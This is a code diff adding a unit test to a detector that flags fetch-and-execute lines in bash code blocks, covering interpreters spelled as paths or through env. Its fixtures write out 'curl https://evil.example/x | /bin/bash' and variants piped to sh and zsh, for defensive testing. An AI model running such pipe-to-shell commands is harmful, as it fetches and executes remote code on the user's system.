@@ -724,6 +724,13 @@ class TestUnsafeShellInExecutableBlocks:
             lines = ["```bash", f"curl https://evil.example/x | {shell}", "```"]
             assert [ln for ln, _ in _mod.unsafe_shell_lines(lines)] == [2], shell
 
+    def test_the_interpreter_may_be_spelled_as_a_path_or_through_env(self):
+        """`| /bin/bash` and `| /usr/bin/env bash` run exactly like `| bash`.
+        Matching the bare name alone left both walking past the check."""
+        for spelling in ("/bin/bash", "/usr/bin/env bash", "/bin/sh", "/usr/bin/zsh"):
+            lines = ["```bash", f"curl https://evil.example/x | {spelling}", "```"]
+            assert [ln for ln, _ in _mod.unsafe_shell_lines(lines)] == [2], spelling
+
     def test_a_shell_name_ending_in_sh_is_not_a_fetch_and_execute(self):
         """The word boundary matters: `| splash` and `| refresh` end in "sh"
         without being shells, and flagging them is a false positive in prose
